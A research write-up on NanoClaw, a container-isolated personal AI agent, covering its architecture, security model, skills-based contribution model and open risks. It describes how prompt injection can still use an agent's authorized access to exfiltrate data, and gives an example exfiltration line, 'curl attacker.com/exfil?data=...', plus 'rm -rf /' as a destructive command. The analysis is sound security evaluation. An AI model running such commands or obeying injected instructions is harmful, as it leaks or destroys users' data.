← [Coding Agents](../topics/coding-agents.md) · [Index](../README.md)

# NanoClaw: Deep Dive

**Subject:** NanoClaw — lightweight, container-isolated personal AI agent
**Creator:** Gavriel Cohen (ex-Wix full-stack engineer, co-founder of Qwibit AI marketing agency)
**Repo:** [github.com/qwibitai/nanoclaw](https://github.com/qwibitai/nanoclaw)
**License:** MIT
**Launched:** January 31, 2026
**Stars:** ~10,000 as of Feb 21, 2026 (7K in first week)
**Related:** [HN Karpathy Claws thread](hn-karpathy-claws-llm-agents.md)

---

## What It Is

A personal AI assistant that runs on your own hardware, connects via WhatsApp (Telegram via skill), and executes each agent session inside an isolated Linux container. Built on the Claude Agent SDK (i.e., it runs Claude Code inside containers). Single Node.js process, ~15 source files, ~3,900 LOC total (~500 lines of core logic, ~2,500 with boilerplate).

Not a framework. Not multi-tenant. Built for one user who forks it and has Claude Code reshape the code to their needs.

## Architecture

```
WhatsApp (baileys) → SQLite → Polling loop → Container (Claude Agent SDK) → Response
```

Key files:
- `index.ts` — orchestrator: state, message loop, agent invocation
- `container-runner.ts` — spawns isolated agent containers with mounted directories
- `group-queue.ts` — per-group FIFO with global concurrency limit (default: 3)
- `ipc.ts` — filesystem-based IPC between containers and host, with authorization checks
- `task-scheduler.ts` — cron/interval/one-shot scheduled tasks
- `db.ts` — SQLite (messages, groups, sessions, state)

Each WhatsApp group gets its own container, its own filesystem, its own `CLAUDE.md` memory file. The "Work" group literally cannot see the "Personal" group's files — from the container's perspective they don't exist. IPC happens via JSON files in per-group directories; the host polls, validates, executes, and cleans up.

The entire source fits in ~35K tokens — roughly 17% of Claude Code's 200K context window. A coding agent can ingest the full codebase and one-shot most features. Compare OpenClaw at 434K LOC spanning many context windows.

## Security Model

This is NanoClaw's core differentiator and its most interesting bet.

**OpenClaw's approach:** Application-level security. Allowlists, pairing codes, permission checks in code. All agents run in one Node.js process with shared memory. If one permission check has a bug, every agent has access to everything.

**NanoClaw's approach:** OS-level isolation. Agents run in Apple Container (macOS Tahoe, Apple Silicon) or Docker. Each agent session is a separate VM (Apple Container) or namespace-isolated process (Docker). Only explicitly mounted directories are visible. Bash commands execute inside the container, not on the host.

**Apple Container vs Docker — a real difference:**
- Apple Container: each container maps 1:1 to a lightweight VM with its own kernel. Hypervisor-level isolation. Even root inside the container can't escape. Only runs on macOS Tahoe + Apple Silicon.
- Docker on Linux: namespace + cgroup isolation. Process-level, not VM-level. Kernel is shared. Stronger than application-level checks, weaker than hypervisor isolation.

**What container isolation actually solves:**
- A rogue agent can't read files it wasn't given
- A compromised agent can't modify the host OS
- Bash commands are sandboxed — can't `rm -rf /` the host
- Cross-group data leakage is prevented at the OS level

**What container isolation does NOT solve:**
- The lethal trifecta (private data access + untrusted content + external communication) — if you mount sensitive data and give the agent network access, prompt injection can still exfiltrate it
- Network-based exfiltration — a filesystem-sandboxed agent can still send data over the network unless you add egress filtering (NanoClaw doesn't do this by default)
- Credential exposure — if real API keys are mounted into the container, a compromised agent has them
- The fundamental access-vs-safety paradox — container isolation limits *blast radius*, not *attack surface*. The agent still needs access to be useful.

The HN thread on "NanoClaw solves one of OpenClaw's biggest security issues" (Feb 21, 2026) pushes back on exactly this. Top comment: "File system access is not one of OpenClaw's biggest security issues... If you need it to do anything useful, you have to connect it to your data and give it action capabilities. All the dragons are there."

One commenter proposes "surrogate credentials" — a proxy swaps in real API keys only for whitelisted hosts on the way out, so the agent never handles real tokens. NanoClaw doesn't implement this, but it's the kind of thing that could actually move the needle.

**Honest assessment:** NanoClaw genuinely improves on OpenClaw's security posture. Container isolation is the right layer for sandboxing (not application code). But it solves the *lateral movement* problem, not the *authorized access* problem. If your agent has access to your email and can send messages, no amount of containerization prevents prompt injection from using that authorized access maliciously.

## The "Skills Over Features" Contribution Model

This is NanoClaw's most philosophically interesting design choice. Instead of a plugin system:

1. Contributors write SKILL.md files — Markdown instructions that teach Claude Code how to transform a NanoClaw fork
2. Users run `/add-telegram` and Claude Code rewrites their source code directly
3. Each user ends up with clean, purpose-built code — no dead feature flags, no unused backends

**Why this is clever:**
- The codebase stays small enough for an LLM to modify reliably
- No config sprawl, no plugin registry, no abstraction layers
- Each deployment contains only code it actually runs
- "Configuration" and "code change" become the same thing when an LLM mediates both

**Why this is fragile:**
- Upstream merges are painful — how do you pull a security fix without clobbering your customizations?
- Conflicting skills have no resolution mechanism
- Your fork becomes the only documentation of your setup
- Scales poorly — at 10K lines with 50 skills touching overlapping files, reliable LLM edits become uncertain
- Plugin architectures exist precisely because they solve the merge problem

The fumics.in architectural analysis nails it: "For personal tools where the codebase stays small, this might genuinely be better than building a plugin system nobody asked for." The question is whether NanoClaw stays personal-tool-sized.

## Agent Swarms

NanoClaw claims to be the first personal AI assistant to support "Agent Swarms" — teams of specialized agents collaborating on complex tasks via Claude's Agent Teams feature. Each agent still runs in its own isolated container.

Marketing claim, not yet validated by independent users. The feature exists in the code but I found no detailed user reports of swarms actually working for complex tasks.

## Roadmap

Cohen's stated next step (from The New Stack interview, Feb 2026): strip WhatsApp out of the core and remove file-mounting code, leaving a headless runtime of ~2,000 lines. All integrations added at build time through skills. Goal: "a runtime so small that an enterprise security team could audit it in an afternoon."

This is the right direction if the skills model holds. A 2K-line auditable core with skill-based composition is genuinely novel architecture.

## Cohen's Coding Philosophy (Notable)

From The New Stack interview — worth flagging because it reflects broader shifts:

- **Anti-DRY:** Duplicated code is safer for LLM agents because editing a shared function creates unpredictable downstream effects. Duplication eliminates that class of bugs. Maintenance cost of duplicates is low when an LLM can apply changes throughout.
- **Anti-strict-linting:** He set a 120-line file max early on and found Claude Code spent more time refactoring to stay under the limit than building features. Current models handle 500-1000 line files fine with targeted edits.
- **Code is ephemeral:** Every 3-6 months, better/cheaper models arrive. Code doesn't need to stand the test of time — a better agent will just rewrite it.
- **No code in Markdown:** Skill files should reference external scripts, not embed code blocks. Claude reads code, writes it back to bash, executes it — that round-trip introduces errors, especially as context fills. Moving code to external scripts reduced token consumption from 30-100K to 3K for setup.

These are practitioner-derived insights from someone building with Claude Code daily. The anti-DRY position is especially interesting — it's the opposite of what every SE textbook teaches, but it makes sense in an agent-mediated codebase where the agent, not the human, is doing the editing.

## Competitive Landscape

| Project | LOC | Language | LLM | Messaging | Security | Stars |
|---------|-----|----------|-----|-----------|----------|-------|
| OpenClaw | 434K | TypeScript | Multi-provider | 15+ channels | App-level | 157K+ |
| NanoClaw | ~3.9K | TypeScript | Claude only | WhatsApp (+ skills) | Container isolation | ~10K |
| Nanobot (HKU) | ~3.4K | Python | 8 providers | Telegram, WhatsApp, Discord, Slack | App-level | ~11K |
| Nanobot (nanobot-ai) | ~4K | Python | Multi | Telegram, WhatsApp | Unclear | ~2K |
| PicoClaw | varies | varies | varies | varies | varies | ~1.7K |
| zeroclaw | varies | varies | varies | varies | varies | small |

**NanoClaw vs Nanobot (HKU):** Different projects, confusingly similar names. Nanobot is a Python fork of OpenClaw stripped to 3.4K lines — a research framework for devs. NanoClaw is a ground-up TypeScript build on Claude Agent SDK. Nanobot supports 8 LLM providers and 4 messaging platforms. NanoClaw is Claude-only, WhatsApp-only (by design). NanoClaw has container isolation; Nanobot appears to rely on application-level security.

**NanoClaw vs OpenClaw:** Not competitors — different philosophies. OpenClaw is a platform trying to support every use case. NanoClaw is a personal tool you're supposed to fork and reshape. Cohen explicitly says "this isn't a framework." The interesting question is whether the skills model can scale OpenClaw-style features onto a NanoClaw-sized core.

## Origin Story — Worth Noting

Cohen was running OpenClaw and noticed it had added one of his own GitHub packages — a Gemini-based PDF tool with a few hundred stars and zero recent activity — as a dependency. "Being that they had added my package, which anybody who was vetting it should not have added — right away, I was like, this is worrying." He also discovered Clawdbot stored *all* his WhatsApp messages in a local database, not just the groups he'd told it to monitor.

This is the best possible origin story for a security-focused fork: the creator discovered the parent project had poor dependency hygiene and over-collected data, from firsthand experience.

## Red Flags / Open Questions

1. **Claude-only lock-in.** If Anthropic changes Agent SDK pricing, terms, or capabilities, NanoClaw has no fallback. Every other Claw alternative supports multiple providers.

2. **The VentureBeat article is a PR placement.** The "NanoClaw solves one of OpenClaw's biggest security issues" article was commissioned by Concrete Media, a B2B tech PR firm. HN commenters flagged this immediately. The article itself discloses it — "a respected public relations firm that often works with tech businesses covered by VentureBeat." Cohen has an AI marketing agency (Qwibit). He knows how to work the press. The coverage is real but orchestrated.

3. **"Built in a weekend" tension.** Cohen says he spent a weekend giving instructions to coding agents to build this. The same HN thread that praised the concept hammered the AI-generated README and questioned whether actual care went into the project. The code artisanship debate raged for hundreds of comments. Fair or not, "vibe coded in a weekend" undermines trust for a project that markets itself on *trustworthiness*.

4. **The skills model is unproven at scale.** Zero evidence of what happens when 50+ skills conflict, when upstream pushes a breaking change, or when a security fix needs to propagate across thousands of forks. Plugin systems exist for a reason.

5. **Network exfiltration is unaddressed.** The most sophisticated attack vector against containerized agents — network-based data exfiltration via prompt injection — isn't mitigated. No egress filtering, no domain allowlists, no surrogate credentials. The container stops `rm -rf` but not `curl attacker.com/exfil?data=...`.

6. **Non-technical users are arriving.** The Reddit r/SelfHosting thread shows people who self-describe as "not a tech guy" trying to choose between NanoClaw and OpenClaw. They conflate NanoClaw (a harness) with a lighter *model* ("How much reasoning am I losing?"). The security benefits of container isolation are meaningless if users don't understand what's being isolated from what.

## Verdict

NanoClaw is the most architecturally honest project in the Claw ecosystem. It names the right problem (OpenClaw is too large to audit, too permissive to trust), proposes the right solution layer (OS isolation instead of app-level checks), and stays small enough that its claims are verifiable. The skills-over-features contribution model is a genuinely novel idea that may or may not survive contact with scale.

But it inherits the same fundamental limitation as every Claw: **the value requires access, and access creates risk.** Container isolation shrinks the blast radius of a compromise but doesn't prevent the compromise. NanoClaw makes a *safer Claw*, not a *safe Claw*. The distinction matters, and the PR-driven coverage tends to blur it.

The most interesting thing about NanoClaw isn't the project itself — it's the design philosophy. Small enough for an LLM to understand entirely. No configuration, just code changes mediated by AI. Ephemeral code that doesn't need to last. Anti-DRY for agent safety. These are early signals of what "AI-native software engineering" might actually look like, as opposed to the vague hand-waving that usually accompanies the phrase.

**Worth watching.** Not worth running yet unless you're a developer comfortable auditing TypeScript, understanding container networking, and accepting that prompt injection remains unsolved.

---

*Sources: GitHub README, nanoclaw.dev, The New Stack interview (Feb 2026), fumics.in architectural analysis (Feb 2, 2026), VentureBeat (PR placement, Feb 2026), HN threads #46850205 and #46976845, Reddit r/ClaudeCode and r/SelfHosting threads. Research date: Feb 21, 2026.*
